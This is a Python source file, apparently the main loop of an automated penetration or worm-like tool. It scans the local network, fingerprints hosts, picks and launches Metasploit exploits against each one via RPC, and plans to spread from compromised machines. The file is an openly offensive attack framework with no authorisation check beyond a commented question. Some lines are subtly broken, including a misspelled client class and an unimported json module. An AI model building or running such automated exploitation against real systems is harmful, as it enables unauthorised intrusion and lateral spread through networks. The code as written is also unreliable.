import Identifier
import Enricher
import Orchestrator.Selector as Selector
import Exploiter
from record import Record

from pymongo import MongoClient
from metasploit.msfrpc import MsfRpcClient
from json import loads

def main():
    ### setup
    # check for dependencies - nmap, ms, mongo
    # check for legally scanned network?
    # initialize structures for orchestration
    # connect to database
    # connect to msf rpc
    # initialize exploits + data for selector
    # initialize logging

    dbClient = MongoClient()
    dbRef = dbClient["NetSprawl"]
    netMapTable = dbRef["Map"]
    exploitTable = dbRef["Exploits"] # TODO export weights from Selector

    msfClient = MsfRpfClient("pass")

    hostCollection = []
    rootHost = None

    enrichQueue = []
    exploitQueue = []
    postexQueue = []

    strategy = Selector.defaultStrategy(Exploiter.getExploitNames())

    log_file = open("ophio_log.txt", 'a') # TODO proper logging library, use throughout



    ### identifier
    # call scanCurrentNetwork on initial host
    # log results of scan
    # identify root node
    # add host records to database

    identifyResults = json.loads(Identifier.scanCurrentNetwork())
    rootInterfaces = []
    hostsDiscovered = []
    for network in identifyResults:
        rootInterfaces.append(network["network"])
        for hostIp in network["hosts"]:
            if hostIp not in rootInterfaces:
                hostsDiscovered.append(hostIp)

    rootHost = Record(rootInterfaces, None)
    rootHost.exploitStatus["statusCode"] = Record.STATUS_SUCCESS
    rootHost.exploitStatus["exploitUsed"] = "N/A"
    record = rootHost.toDict()
    netMapTable.insert(record)
    rootHost.id = record["_id"]
    hostCollection.append(rootHost)
    enrichQueue.append(rootHost)

    for hostIp in hostsDiscovered:
        hostRecord = Record([hostIp], rootHost.id)
        record = hostRecord.toDict()
        netMapTable.insert(record)
        hostRecord.id = record["_id"]
        hostCollection.append(hostRecord)
        enrichQueue.append(hostRecord)



    ### enricher
    # call scanHostsForInfo on list of hosts, excluding self
    # log results of scans
    # append information to host records in database

    while len(enrichQueue) > 0:
        hostRecord = enrichQueue.pop()
        enrichResults = json.loads(Enricher.scanHostForInfo(hostRecord.interfaces))
        hostRecord.os = enrichResults[0]
        hostRecord.openPorts = enrichResults[1:]
        # TODO update hostRecord in netMapTable, filtering by hostRecord.id
        exploitQueue.append(hostRecord)



    ### selector/exploiter
    # call search on enriched host data
    # attempt exploits in recommended order
    # log results and update selector after each exploit run
    # append exploit status (exploit used, MS session) to host records

    while len(exploitQueue) > 0:
        hostRecord = exploitQueue.pop()
        hostIp = hostRecord.interfaces[0]
        hostData = [hostRecord.os, hostRecord.openPorts]
        exploitOrder = strategy.search(hostData)

        for exploit in exploitOrder:
            exploitResults = Exploiter.callExploit(msfClient, exploit, hostIp)
            exploitSuccess = exploitResults["job_id"] != None
            strategy.update(hostData, exploit, exploitSuccess)
            if exploitSuccess:
                break

        if exploitResults["job_id"] == None:
            hostRecord.exploitStatus["statusCode"] = Record.STATUS_FAILURE
        else:
            hostRecord.exploitStatus = {
                "statusCode": Record.STATUS_SUCCESS,
                "exploitUsed": exploitResults["uuid"], # TODO nab exploit name too/instead
                "msSessionId": exploitResults["job_id"]
            }
        # TODO update hostRecord in netMapTable
        postexQueue.append(hostRecord)



    ### post-exploits
    # drop and run identifier on exploited boxes
    # add new hosts to records + database
    # enrich and exploit new hosts as usual
    while len(postexQueue) > 0:
        hostRecord = postexQueue.pop()
        print(hostRecord)



    ### repetition
    # each host should be identified, enriched, exploited, and scanned from:
    # a) seperate queues for each stage, evaluated independently
    # b) single queue, each host evaluated straight through
    #
    # identifiers should be rerun periodically to identify new hosts
    #
    # alternative: run once, and restore state from DB info on startup

    ### logging and reporting
    # writing activities to a log file from lifecycle is a decent start
    # function (seperate script?) to produce report on network map & status from memory state or db records

if __name__ == '__main__':
    main()
